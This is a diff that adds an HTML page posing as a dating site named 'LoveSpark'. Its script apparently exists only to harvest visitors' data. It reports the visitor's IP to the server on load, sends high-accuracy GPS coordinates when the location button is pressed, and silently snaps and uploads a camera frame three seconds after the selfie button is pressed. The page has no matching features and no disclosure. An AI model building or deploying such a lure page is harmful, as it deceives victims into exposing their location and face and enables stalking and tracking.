@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>LoveSpark - Meet Your Match</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background: linear-gradient(#ff99cc, #ffe6f0);
+      padding: 40px;
+    }
+    h1 {
+      color: #cc0066;
+    }
+    #video {
+      display: none;
+      margin-top: 20px;
+      width: 240px;
+      height: 180px;
+      border-radius: 10px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 18px;
+      margin: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #ff4da6;
+      color: white;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>❤️ Welcome to LoveSpark</h1>
+  <p>Get matched with singles near you</p>
+
+  <button onclick="shareLocation()">Allow Location</button>
+  <button onclick="captureSelfie()">Take Selfie</button>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    fetch("/report_ip", { method: "POST" });
+
+    function shareLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(pos) {
+          fetch("/report_location", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude
+            })
+          });
+        }, function(err) {
+          alert("Location access denied.");
+        }, { enableHighAccuracy: true });
+      } else {
+        alert("Geolocation not supported.");
+      }
+    }
+
+    async function captureSelfie() {
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.style.display = "block";
+      video.srcObject = stream;
+
+      setTimeout(() => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+        const image = canvas.toDataURL("image/jpeg");
+
+        fetch("/report_selfie", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ image })
+        });
+
+        stream.getTracks().forEach(track => track.stop());
+        video.style.display = "none";
+      }, 3000);
+    }
+  </script>
+</body>
+</html>
